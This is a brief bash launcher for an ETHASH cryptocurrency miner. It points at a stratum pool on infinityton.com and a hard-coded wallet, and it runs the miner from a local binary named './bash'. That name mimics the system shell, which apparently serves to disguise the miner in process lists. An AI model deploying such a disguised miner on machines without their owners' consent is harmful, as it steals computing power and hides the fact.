#!/bin/bash

POOL=stratum+tcp://ethash.infinityton.com:14444
WALLET=EQBX63RAdgShn34EAFMV73Cut7Z15lUZd1hnVva68SEl7sxi+49414773127.1 --watchdog exit

./bash --algo ETHASH --pool $POOL --user $WALLET $@
